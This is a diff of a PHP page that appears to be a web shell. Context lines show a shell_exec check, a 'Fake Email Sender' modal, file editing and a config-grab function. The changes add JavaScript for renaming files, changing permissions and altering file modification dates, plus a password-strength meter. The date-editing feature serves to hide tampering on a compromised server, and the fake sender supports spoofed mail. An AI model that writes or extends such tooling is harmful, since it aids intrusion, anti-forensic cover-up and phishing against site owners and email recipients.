         <div class="modal-content">
             <h3>📁 Create New Folder</h3>
@@ -987,6 +1781,7 @@ if(function_exists('shell_exec')) {
         </div>
     </div>
 
+    <!-- Email Modal -->
     <div id="emailModal" class="modal">
         <div class="modal-content">
             <h3>📧 Fake Email Sender</h3>
@@ -1063,7 +1858,6 @@ if(function_exists('shell_exec')) {
     }
     
     function editFile(file) {
-        // Load file content via AJAX
         fetch('?get_file=' + encodeURIComponent(file))
             .then(response => response.text())
             .then(content => {
@@ -1076,6 +1870,34 @@ if(function_exists('shell_exec')) {
             });
     }
     
+    function renameFile(file) {
+        const fileName = file.split('/').pop();
+        document.getElementById('renameOldPath').value = file;
+        document.getElementById('renameCurrentName').value = fileName;
+        document.getElementById('renameNewName').value = fileName;
+        showModal('renameModal');
+    }
+    
+    function showChmodModal(file, currentPerms) {
+        const fileName = file.split('/').pop();
+        document.getElementById('chmodFilePath').value = file;
+        document.getElementById('chmodFileName').value = fileName;
+        document.getElementById('chmodCurrentPerms').value = currentPerms;
+        showModal('chmodModal');
+    }
+    
+    function editFileDate(file, currentDate) {
+        document.getElementById('editDateFilePath').value = file;
+        document.getElementById('editDateFileName').value = file.split('/').pop();
+        
+        // Convert current date to datetime-local format
+        const dateObj = new Date(currentDate);
+        const formattedDate = dateObj.toISOString().slice(0, 16);
+        document.getElementById('editDateInput').value = formattedDate;
+        
+        showModal('editDateModal');
+    }
+    
     function getConfig() {
         window.location.href = '?get_config=1&d=<?php echo urlencode(str_replace($BASE_DIR . '/', '', $current_dir)); ?>';
     }
@@ -1086,6 +1908,30 @@ if(function_exists('shell_exec')) {
         form.innerHTML = '<input name="theme_toggle" value="1"><input name="theme" value="<?php echo $THEME; ?>">';
         document.body.appendChild(form);
         form.submit();
+    }
+    
+    function checkPasswordStrength(passwordFieldId) {
+        const password = document.getElementById(passwordFieldId).value;
+        const strengthBar = document.getElementById('passwordStrengthBar');
+        
+        let strength = 0;
+        if (password.length >= 8) strength++;
+        if (password.match(/[a-z]/) && password.match(/[A-Z]/)) strength++;
+        if (password.match(/\d/)) strength++;
+        if (password.match(/[^a-zA-Z\d]/)) strength++;
+        
+        strengthBar.className = 'password-strength-bar';
+        if (password.length === 0) {
+            strengthBar.style.width = '0%';
+        } else if (strength === 1) {
+            strengthBar.className += ' strength-weak';
+        } else if (strength === 2) {
+            strengthBar.className += ' strength-fair';
+        } else if (strength === 3) {
+            strengthBar.className += ' strength-good';
+        } else if (strength === 4) {
+            strengthBar.className += ' strength-strong';
+        }
     }
     
     // Auto-hide notification
